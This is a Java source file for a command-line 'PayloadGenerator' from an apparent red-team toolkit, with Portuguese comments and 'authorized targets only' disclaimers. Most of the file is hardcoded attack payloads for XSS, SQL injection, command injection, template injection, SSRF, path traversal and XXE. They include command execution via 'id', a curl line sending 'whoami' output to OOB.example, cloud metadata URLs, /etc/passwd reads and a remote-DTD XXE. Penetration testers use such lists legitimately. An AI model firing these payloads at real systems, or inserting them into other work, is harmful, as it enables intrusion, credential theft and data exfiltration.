package io.redteam.essentials;

import java.io.IOException;
import java.io.PrintStream;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.security.SecureRandom;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Base64;
import java.util.List;
import java.util.Locale;

/**
 * PayloadGenerator - gera payloads de teste para classes de vulnerabilidade comuns
 * (XSS, SQLi, command injection, SSTI, SSRF, LFI, XXE).
 *
 * Educational only. Use apenas em alvos AUTORIZADOS.
 *
 * Build (sem maven/gradle):
 *   javac -d build src/main/java/io/redteam/essentials/PayloadGenerator.java
 *   java  -cp build io.redteam.essentials.PayloadGenerator --list
 *   java  -cp build io.redteam.essentials.PayloadGenerator --type xss --count 20 --encode url
 *   java  -cp build io.redteam.essentials.PayloadGenerator --type sqli --out payloads.txt
 *
 * Autor:    Samuel Ziger - RedTeam Essentials
 * Versao:   2.0.0
 * Licenca:  MIT
 */
public final class PayloadGenerator {

    private static final SecureRandom RNG = new SecureRandom();

    // ---- Catalogo de payloads (resumido, mas representativo) ----

    private static final String[] XSS = {
        "<script>alert(1)</script>",
        "\"><svg/onload=alert(1)>",
        "javascript:alert(1)",
        "<img src=x onerror=alert(1)>",
        "<iframe srcdoc=\"<script>alert(1)</script>\"></iframe>",
        "<details/open/ontoggle=alert(1)>",
        "<body onload=alert(1)>",
        "<input autofocus onfocus=alert(1)>",
        "<svg><script>alert(1)</script></svg>",
        "<math><mtext></mtext><script>alert(1)</script></math>",
        // Bypasses comuns
        "<scr<script>ipt>alert(1)</scr</script>ipt>",
        "%3Cscript%3Ealert(1)%3C/script%3E",
        "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
    };

    private static final String[] SQLI = {
        "' OR '1'='1' --",
        "\" OR \"1\"=\"1\" --",
        "' OR 1=1 --",
        "admin' --",
        "admin' #",
        "') OR ('1'='1",
        "' UNION SELECT NULL --",
        "' UNION SELECT NULL,NULL --",
        "' UNION SELECT NULL,NULL,NULL --",
        "1' AND SLEEP(5) --",
        "1' AND BENCHMARK(5000000,MD5('A')) --",
        "1; WAITFOR DELAY '0:0:5' --",
        "1' OR pg_sleep(5)--",
        "0 UNION SELECT user(),version()--",
        "' OR EXTRACTVALUE(1,CONCAT(0x7e,version())) --",  // mysql error
    };

    private static final String[] CMDI = {
        "; id",
        "| id",
        "&& id",
        "$(id)",
        "`id`",
        "; sleep 5",
        "| sleep 5",
        "; curl http://OOB.example/$(whoami)",
        "%0Aid",
        "$IFS$9id",
    };

    private static final String[] SSTI = {
        "{{7*7}}",
        "${7*7}",
        "<%= 7*7 %>",
        "{{config.items()}}",
        "{{''.__class__.__mro__[1].__subclasses__()}}",
        "${T(java.lang.Runtime).getRuntime().exec('id')}",   // spring SpEL
        "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
    };

    private static final String[] SSRF = {
        "http://127.0.0.1/",
        "http://localhost/",
        "http://[::1]/",
        "http://169.254.169.254/latest/meta-data/",          // AWS
        "http://metadata.google.internal/computeMetadata/v1/?recursive=true",
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",  // Azure
        "gopher://127.0.0.1:6379/_INFO",                     // gopher to Redis
        "file:///etc/passwd",
        "dict://127.0.0.1:11211/stats",
    };

    private static final String[] LFI = {
        "../../../../etc/passwd",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%c0%af..%c0%af..%c0%afetc/passwd",
        "/proc/self/environ",
        "php://filter/convert.base64-encode/resource=index",
        "expect://id",
        "C:\\Windows\\System32\\drivers\\etc\\hosts",
    };

    private static final String[] XXE = {
        "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><r>&x;</r>",
        "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY % p SYSTEM \"http://OOB.example/x.dtd\">%p;]><r/>",
        "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"php://filter/read=convert.base64-encode/resource=/etc/passwd\">]><r>&x;</r>",
    };

    private enum PType {
        XSS(PayloadGenerator.XSS),
        SQLI(PayloadGenerator.SQLI),
        CMDI(PayloadGenerator.CMDI),
        SSTI(PayloadGenerator.SSTI),
        SSRF(PayloadGenerator.SSRF),
        LFI(PayloadGenerator.LFI),
        XXE(PayloadGenerator.XXE);
        final String[] payloads;
        PType(String[] p) { this.payloads = p; }
    }

    // ---- CLI ----

    public static void main(String[] args) {
        if (args.length == 0 || hasFlag(args, "-h", "--help")) {
            printUsage(System.out);
            return;
        }
        if (hasFlag(args, "--list")) {
            for (PType t : PType.values())
                System.out.printf("%-6s %3d payloads%n", t.name().toLowerCase(Locale.ROOT), t.payloads.length);
            return;
        }

        String type    = arg(args, "--type", null);
        int    count   = Integer.parseInt(arg(args, "--count", "10"));
        String encode  = arg(args, "--encode", "raw");        // raw|url|b64
        String outFile = arg(args, "--out", null);
        boolean random = hasFlag(args, "--random");

        if (type == null) {
            System.err.println("[x] use --type <xss|sqli|cmdi|ssti|ssrf|lfi|xxe>");
            System.exit(2);
        }
        PType t;
        try {
            t = PType.valueOf(type.toUpperCase(Locale.ROOT));
        } catch (IllegalArgumentException ex) {
            System.err.println("[x] tipo desconhecido: " + type);
            System.exit(2);
            return;
        }

        List<String> base = new ArrayList<>(Arrays.asList(t.payloads));
        if (random) java.util.Collections.shuffle(base, RNG);
        List<String> picked = base.subList(0, Math.min(count, base.size()));

        List<String> encoded = new ArrayList<>(picked.size());
        for (String p : picked) encoded.add(encode(p, encode));

        if (outFile != null) {
            try {
                Files.writeString(Path.of(outFile), String.join("\n", encoded) + "\n", StandardCharsets.UTF_8);
                System.err.println("[+] " + encoded.size() + " payloads -> " + outFile);
            } catch (IOException ex) {
                System.err.println("[x] falha escrita: " + ex.getMessage());
                System.exit(1);
            }
        } else {
            for (String p : encoded) System.out.println(p);
        }
    }

    // ---- Helpers ----

    private static String encode(String s, String mode) {
        return switch (mode.toLowerCase(Locale.ROOT)) {
            case "url" -> URLEncoder.encode(s, StandardCharsets.UTF_8);
            case "b64" -> Base64.getEncoder().encodeToString(s.getBytes(StandardCharsets.UTF_8));
            default    -> s;
        };
    }

    private static boolean hasFlag(String[] args, String... names) {
        for (String a : args)
            for (String n : names)
                if (a.equals(n)) return true;
        return false;
    }

    private static String arg(String[] args, String name, String def) {
        for (int i = 0; i < args.length - 1; i++)
            if (args[i].equals(name)) return args[i + 1];
        return def;
    }

    private static void printUsage(PrintStream out) {
        out.println("""
            PayloadGenerator - RedTeam Essentials

            Uso:
              java io.redteam.essentials.PayloadGenerator --list
              java io.redteam.essentials.PayloadGenerator --type <xss|sqli|cmdi|ssti|ssrf|lfi|xxe>
                                                          [--count N] [--encode raw|url|b64]
                                                          [--random] [--out file.txt]

            AVISO: Use apenas em alvos AUTORIZADOS. Conteudo educacional.
            """);
    }
}
